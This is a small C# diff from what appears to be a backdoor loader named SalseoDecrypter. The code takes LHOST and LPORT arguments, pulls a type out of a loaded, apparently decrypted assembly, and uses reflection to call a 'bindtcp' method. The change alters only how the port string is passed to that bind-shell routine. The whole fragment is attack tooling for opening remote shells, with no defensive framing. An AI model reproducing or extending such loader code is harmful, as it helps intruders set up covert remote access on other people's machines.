@@ -171,7 +171,7 @@ namespace SalseoDecrypter
             {
                 string LHOST = args[3].ToString();
                 string LPORT = args[4].ToString();
-                string[] argumentos = new string[] { LPORT };
+                string[] argumentos = new string[] { LPORT + " " };
                 Type myType = salsongo.GetTypes()[0];
                 MethodInfo Method = myType.GetMethod("bindtcp");
                 object myInstance = Activator.CreateInstance(myType);
